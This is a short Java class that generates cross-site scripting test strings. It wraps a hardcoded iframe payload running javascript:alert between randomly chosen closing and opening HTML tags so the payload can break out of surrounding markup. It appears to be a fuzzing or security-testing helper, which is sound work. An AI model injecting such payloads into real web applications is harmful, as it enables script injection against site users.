import java.util.ArrayList;
import java.util.Arrays;
import java.util.Random;

public class XSSGenerator {
    private static final ArrayList<String>  tags = new ArrayList<>(Arrays.asList("div", "p", "h1","h2"));
    private static final String maliciousString = "<iframe src=javascript:alert(\"attack\")></iframe>";
    // or an example of another malicious input is to run an external malicious script
    public static String generateXSSGenerator(int size){
        Random rand = new Random();
        String output="";
        int length = tags.size();
        ArrayList<String> seq = new ArrayList<>();
        for(int i=0;i<size;i++){
            int theTag = rand.nextInt(length);
            seq.add(i,tags.get(theTag));
            output=output+"</"+tags.get(theTag)+">";
        }
        output=output+maliciousString;
        for(int i=seq.size()-1;i>=0;i--){
            output=output+"<"+seq.get(i)+">";
        }
        return output;
    }
}
